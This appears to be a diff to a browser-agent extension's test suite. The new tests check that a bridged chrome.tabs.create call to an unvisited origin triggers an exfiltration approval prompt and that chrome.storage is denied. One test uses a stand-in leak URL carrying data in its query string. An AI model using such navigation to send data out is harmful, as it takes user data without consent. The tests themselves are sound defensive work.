@@ -55,7 +55,8 @@ async function promptsSince(fa: FaHarness, after: number) {
 /**
  * One browser_api turn: sends the directive, answers every approval
  * prompt it raises (ask mode: the matrix prompt; write mode: the
- * exec-tier risk ask), and resolves with the tool_result.
+ * exec-tier risk ask AND the exfil ask for navigation/download), and
+ * resolves with the tool_result.
  */
 async function runBridgeTurn(
   fa: FaHarness,
@@ -68,8 +69,7 @@ async function runBridgeTurn(
   for (;;) {
     const evt = await fa.waitEvent(
       (e) =>
-        (e.type === 'approval_request' &&
-          String(e.summary).includes('browser_api')) ||
+        e.type === 'approval_request' ||
         (e.type === 'tool_result' && e.toolName === 'browser_api'),
       45_000,
       after,
@@ -370,7 +370,10 @@ test.describe.serial('chrome.* bridge (issue #137)', () => {
     await fa.collectEvents();
 
     // The bridge path: chrome.debugger attach → Runtime.evaluate →
-    // detach — the exact CDP mechanism the curated inject_js rides.
+    // detach — the same CDP mechanism the curated cdp_eval rides
+    // (inject_js itself is scripting.executeScript funcSource, which a
+    // JSON bridge cannot carry; what this proves is capability parity:
+    // the page-world marker lands either way).
     const attach = await runBridgeTurn(fa, 'chrome.debugger.attach', [
       { tabId },
       '1.3',
@@ -416,5 +419,38 @@ test.describe.serial('chrome.* bridge (issue #137)', () => {
         () => (window as unknown as Record<string, unknown>).__curatedMarker,
       ),
     ).toBe('curated');
+  });
+
+  test('exfil gate: bridge tabs.create to an unvisited origin asks (M1)', async ({
+    fa,
+  }) => {
+    // write mode: the matrix is silent on the read tier, so the ONLY
+    // prompt mid-turn is the exfil ask (tabs.create → windowOpen).
+    await fa.bootAgent('write');
+    await fa.collectEvents();
+
+    const res = await runBridgeTurn(
+      fa,
+      'chrome.tabs.create',
+      [{ url: 'https://unvisited-bridge-origin.example/leak?d=1' }],
+      false, // the user DENIES
+    );
+    // Deny is error-as-data, never a thrown turn.
+    expect(res.isError, res.text).toBe(false);
+    const env = envelopeOf(res.text);
+    expect(env.ok, res.text).toBe(false);
+    expect(env.error?.code, res.text).toBe('approval_required');
+  });
+
+  test('storage namespace is bridge-denied in every mode (M2)', async ({
+    fa,
+  }) => {
+    await fa.bootAgent('yolo');
+    await fa.collectEvents();
+    const res = await runBridgeTurn(fa, 'chrome.storage.local.get', ['x']);
+    expect(res.isError, res.text).toBe(false);
+    const env = envelopeOf(res.text);
+    expect(env.ok, res.text).toBe(false);
+    expect(env.error?.code, res.text).toBe('denied_namespace');
   });
 });
